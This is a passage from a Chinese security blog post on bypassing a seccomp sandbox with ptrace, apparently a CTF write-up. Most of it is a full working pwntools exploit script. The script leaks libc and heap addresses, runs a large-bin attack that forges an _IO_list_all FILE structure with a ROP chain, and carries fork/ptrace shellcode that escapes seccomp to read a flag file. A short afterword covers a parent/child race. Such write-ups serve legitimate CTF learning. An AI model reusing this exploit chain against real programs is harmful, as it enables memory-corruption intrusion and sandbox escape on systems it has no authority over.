+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;&gt;&#39;</span>, <span style=color:#b44>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;Index: &#39;</span>, <span style=color:#a2f>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>show</span>(index):
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;&gt;&#39;</span>, <span style=color:#b44>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span>    sla(<span style=color:#b44>&#39;: &#39;</span>, <span style=color:#a2f>str</span>(index))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#--------------------------泄露libcbase------------------------------</span>
+</span></span><span style=display:flex><span>add(<span style=color:#666>0</span>, <span style=color:#666>0x520</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>1</span>, <span style=color:#666>0x508</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#666>0</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#666>0</span>)
+</span></span><span style=display:flex><span>libcbase <span style=color:#666>=</span>u64(p<span style=color:#666>.</span>recv(<span style=color:#666>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#666>8</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>))<span style=color:#666>-</span> <span style=color:#666>0x1f6cc0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#-----------------------------泄露heapbase----------------------------</span>
+</span></span><span style=display:flex><span>add(<span style=color:#666>2</span>, <span style=color:#666>0x508</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>3</span>, <span style=color:#666>0x518</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>4</span>, <span style=color:#666>0x528</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#666>2</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#666>3</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#666>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>heapbase <span style=color:#666>=</span>u64(p<span style=color:#666>.</span>recv(<span style=color:#666>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#666>8</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>))<span style=color:#666>-</span> <span style=color:#666>0x290</span>
+</span></span><span style=display:flex><span>add(<span style=color:#666>2</span>, <span style=color:#666>0x508</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>3</span>, <span style=color:#666>0x518</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(libcbase)
+</span></span><span style=display:flex><span><span style=color:#a2f>print</span>(<span style=color:#a2f>hex</span>(heapbase))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#-------------------------------large bin attack---------------------------------</span>
+</span></span><span style=display:flex><span>add(<span style=color:#666>5</span>, <span style=color:#666>0x558</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>6</span>, <span style=color:#666>0x558</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>7</span>, <span style=color:#666>0x548</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>8</span>, <span style=color:#666>0x548</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#666>5</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>9</span>, <span style=color:#666>0x598</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#666>7</span>)
+</span></span><span style=display:flex><span>io_list_all <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;_IO_list_all&#39;</span>]
+</span></span><span style=display:flex><span>wfile <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;_IO_wfile_jumps&#39;</span>]
+</span></span><span style=display:flex><span>lock <span style=color:#666>=</span> <span style=color:#666>0x3ed8b0</span> <span style=color:#666>+</span> libcbase
+</span></span><span style=display:flex><span>pop_rdi <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#a2f>next</span>(libc<span style=color:#666>.</span>search(asm(<span style=color:#b44>&#39;pop rdi;ret;&#39;</span>)))
+</span></span><span style=display:flex><span>pop_rsi <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#a2f>next</span>(libc<span style=color:#666>.</span>search(asm(<span style=color:#b44>&#39;pop rsi;ret;&#39;</span>)))
+</span></span><span style=display:flex><span>rsi_r15 <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#666>0x0000000000023b63</span>
+</span></span><span style=display:flex><span>pop_rax <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#666>0x3fa43</span>
+</span></span><span style=display:flex><span>pop_rdx <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#666>0x166262</span>
+</span></span><span style=display:flex><span>ret <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#666>0x233d1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>leave_ret <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#a2f>next</span>(libc<span style=color:#666>.</span>search(asm(<span style=color:#b44>&#39;leave;ret;&#39;</span>)))
+</span></span><span style=display:flex><span>read_addr <span style=color:#666>=</span> libc<span style=color:#666>.</span>symbols[<span style=color:#b44>&#39;read&#39;</span>] <span style=color:#666>+</span> libcbase
+</span></span><span style=display:flex><span>magic_gadget <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#666>0x163090</span> <span style=color:#666>+</span> <span style=color:#666>0x1a</span>
+</span></span><span style=display:flex><span>syscall <span style=color:#666>=</span> read_addr <span style=color:#666>+</span> <span style=color:#666>15</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_io_addr <span style=color:#666>=</span> heapbase <span style=color:#666>+</span> <span style=color:#666>0x16E0</span>
+</span></span><span style=display:flex><span>orw_addr <span style=color:#666>=</span> heapbase <span style=color:#666>+</span> <span style=color:#666>0x2740</span>
+</span></span><span style=display:flex><span>orw <span style=color:#666>=</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;./flag</span><span style=color:#b62;font-weight:700>\x00\x00</span><span style=color:#b44>&#39;</span>
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(rsi_r15) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(fake_io_addr <span style=color:#666>-</span> <span style=color:#666>0x10</span> <span style=color:#666>+</span> <span style=color:#666>0x40</span>)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(pop_rsi) <span style=color:#666>+</span> p64(<span style=color:#666>0x2000</span>)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(pop_rdi) <span style=color:#666>+</span> p64(heapbase)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(pop_rdx) <span style=color:#666>+</span> p64(<span style=color:#666>7</span>)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(pop_rax) <span style=color:#666>+</span> p64(<span style=color:#666>10</span>)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(syscall)
+</span></span><span style=display:flex><span>orw <span style=color:#666>+=</span> p64(ret) <span style=color:#666>+</span> p64(heapbase <span style=color:#666>+</span> <span style=color:#666>0x2a0</span>)
+</span></span><span style=display:flex><span>mprotect <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#b44>&#39;mprotect&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PTRACE_ATTACH <span style=color:#666>=</span> <span style=color:#666>0x10</span>
+</span></span><span style=display:flex><span>PTRACE_SETOPTIONS <span style=color:#666>=</span> <span style=color:#666>0x4200</span>
+</span></span><span style=display:flex><span>PTRACE_CONT <span style=color:#666>=</span> <span style=color:#666>7</span>
+</span></span><span style=display:flex><span>PTRACE_DETACH <span style=color:#666>=</span> <span style=color:#666>0x11</span>
+</span></span><span style=display:flex><span>PTRACE_O_TRACESECCOMP <span style=color:#666>=</span> <span style=color:#666>0x80</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> shellcraft<span style=color:#666>.</span>fork()
+</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> <span style=color:#b44>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#b44>        test eax,eax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        js exit
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /*把child_pid的值存到r15寄存器*/
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov r15,rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        cmp rax,0 
+</span></span></span><span style=display:flex><span><span style=color:#b44>        je child_process
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>    parent_process:
+</span></span></span><span style=display:flex><span><span style=color:#b44>       /*PTRACE_ATTACH  ptrace(request=0x10, v00=&#39;r15&#39;, v1=0, v2=0) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor r10d, r10d /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 0x10
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rdi
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rsi, r15
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call ptrace() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 101 /* 0x65 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* PTRACE_SETOPTIONS  PTRACE_O_TRACESECCOMP  ptrace(request=0x4200, v0=&#39;r15&#39;, v1=0, v2=0x80) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor r10d, r10d
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov r10b, 0x80
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov edi, 0x1010101 /* 16896 == 0x4200 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edi, 0x1014301
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rsi, r15
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call ptrace() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 101 /* 0x65 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>    monitor_child:
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* wait4(pid=0, stat_loc=0, options=0, usage=0) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor r10d, r10d /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edi, edi /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor esi, esi /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call wait4() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 61 /* 0x3d */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /*PTRACE_CONT ptrace(request=7, v0=&#39;r15&#39;, v1=0, v2=0) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor r10d, r10d /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 7
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rdi
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rsi, r15
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call ptrace() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 101 /* 0x65 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        jmp monitor_child
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>       
+</span></span></span><span style=display:flex><span><span style=color:#b44>    child_process:
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* open(file=&#39;./flag&#39;, oflag=0, mode=0) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* push b&#39;./flag</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39; */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rax, 0x101010101010101
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rax, 0x101010101010101 ^ 0x67616c662f2e
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor [rsp], rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rdi, rsp
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor esi, esi /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call open() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 2 /* 2 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* sendfile(out_fd=1, in_fd=&#39;rax&#39;, offset=0, count=0x50) */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 0x50
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop r10
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 1
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rdi
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor edx, edx /* 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rsi, rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* call sendfile() */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        push 40 /* 0x28 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        pop rax
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /*没有成功执行再跳转*/
+</span></span></span><span style=display:flex><span><span style=color:#b44>        cmp rax,0
+</span></span></span><span style=display:flex><span><span style=color:#b44>        jle child_process
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>    exit:
+</span></span></span><span style=display:flex><span><span style=color:#b44>        /* Exit the process */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        mov rax, 60             /* syscall number for exit */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        xor rdi, rdi            /* status 0 */
+</span></span></span><span style=display:flex><span><span style=color:#b44>        syscall
+</span></span></span><span style=display:flex><span><span style=color:#b44>
+</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>edit(<span style=color:#666>0</span>, asm(shellcode))
+</span></span><span style=display:flex><span>edit(<span style=color:#666>8</span>, orw)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(leave_ret) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(io_list_all <span style=color:#666>-</span> <span style=color:#666>0x20</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>2</span> <span style=color:#666>+</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(orw_addr)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>4</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>3</span> <span style=color:#666>+</span> p64(lock)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>2</span> <span style=color:#666>+</span> p64(fake_io_addr <span style=color:#666>+</span> <span style=color:#666>0xe0</span> <span style=color:#666>+</span> <span style=color:#666>0x40</span>) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>4</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(wfile)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>0x1c</span> <span style=color:#666>+</span> p64(fake_io_addr <span style=color:#666>+</span> <span style=color:#666>0xe0</span> <span style=color:#666>+</span> <span style=color:#666>0xe8</span> <span style=color:#666>+</span> <span style=color:#666>0x40</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>*</span> <span style=color:#666>0xd</span> <span style=color:#666>+</span> p64(magic_gadget)
+</span></span><span style=display:flex><span>edit(<span style=color:#666>5</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>add(<span style=color:#666>10</span>, <span style=color:#666>0x640</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#666>11</span>, <span style=color:#666>0x540</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(<span style=color:#b44>&#39;5&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><ul><li>成功拿到flag <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/38.png alt="alt text"></li></ul><h1 id=后记>后记
+<a class=header-anchor href=#%e5%90%8e%e8%ae%b0></a></h1><ul><li>在编写exp的时候要注意，由于子进程是父进程fork出来的，那么我们并无法得知两者执行速度。但在笔者的理解中，只有父进程执行完ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_0_TRACESECCOMP)后，才能真正的绕过沙盒。在此之后子进程才能绕过沙盒随意执行任何系统调用。</li><li>那么就要在sendfile系统调用后加上下面这段，也就是让子进程循环执行open和sendfile这两个系统调用，保证父进程执行完ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_0_TRACESECCOMP)，在此之后子进程就可以顺利执行open和sendfile，那么rax的值也就不会小于等于0，拿到flag程序也就退出了</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#080;font-style:italic>/*没有成功执行再跳转*/</span>
+</span></span><span style=display:flex><span>    <span style=color:#00a000>cmp</span> <span style=color:#800>rax</span>,<span style=color:#666>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#00a000>jle</span> <span style=color:#800>child_process</span>
+</span></span></code></pre></div><ul><li>本地似乎还可以用io_using打通(远程要看内核版本了)，但是笔者还没有学习io_using，所以还没有实践 todo</li></ul></div><footer class=post-footer><div class=post-tags><a href=/tags/ptrace>ptrace</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
+赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
+<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
+<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+基于ptrace的沙箱绕过</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=https://zp9080.github.io/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/ title=基于ptrace的沙箱绕过>https://zp9080.github.io/post/shellcode/%E5%9F%BA%E4%BA%8Eptrace%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/iot/iot%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/ rel=next title=IOT入门学习><i class="fa fa-chevron-left"></i> IOT入门学习</a></div><div class="post-nav-prev post-nav-item"><a href=/post/fuzz/afl-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8B%E7%AF%87/ rel=prev title=afl-fuzz源码分析下篇>afl-fuzz源码分析下篇
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
+<span itemprop=copyrightYear>2024 - 2025
+</span><span class=with-love><i class="fa fa-heart"></i>
+</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
+<img src=/imgs/gongan.png alt=鄂公网安备>
+<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
+</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
+</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
+</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>
